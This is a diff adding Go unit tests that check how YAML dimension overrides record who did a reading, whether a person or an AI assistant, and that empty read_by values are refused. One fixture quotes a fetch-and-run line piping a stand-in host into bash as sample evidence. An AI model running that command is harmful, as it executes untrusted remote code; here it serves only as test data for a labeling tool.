@@ -93,3 +93,34 @@ func TestDimensionOverrideRejectsUnknownField(t *testing.T) {
 		t.Fatal("an unknown field parsed — a typo'd key is a silently ignored correction")
 	}
 }
+
+// `read` is defined as a person's reading. When the reading was a machine's, the override says
+// who read it, so the generated label can say so instead of claiming a hand-read.
+func TestDimensionOverrideCarriesReadBy(t *testing.T) {
+	var got map[string]DimensionOverride
+	src := `
+machine-read:
+  dimensions: [execution]
+  read_by: an AI assistant for the corpus maintainer
+  evidence: {file: SKILL.md, lines: "3", quote: 'curl -sL https://x.example | bash'}
+short: execution
+`
+	if err := yaml.Unmarshal([]byte(src), &got); err != nil {
+		t.Fatalf("unmarshal: %v", err)
+	}
+	if got["machine-read"].ReadBy != "an AI assistant for the corpus maintainer" {
+		t.Errorf("read_by dropped: %+v", got["machine-read"])
+	}
+	if got["short"].ReadBy != "" {
+		t.Error("the short form must not invent a reader")
+	}
+}
+
+// An empty read_by names nobody — it looks like a disclosure and discloses nothing.
+func TestDimensionOverrideRejectsEmptyReadBy(t *testing.T) {
+	var got map[string]DimensionOverride
+	src := "x:\n  dimensions: [execution]\n  read_by: \"\"\n"
+	if err := yaml.Unmarshal([]byte(src), &got); err == nil {
+		t.Fatal("an empty read_by must be refused")
+	}
+}
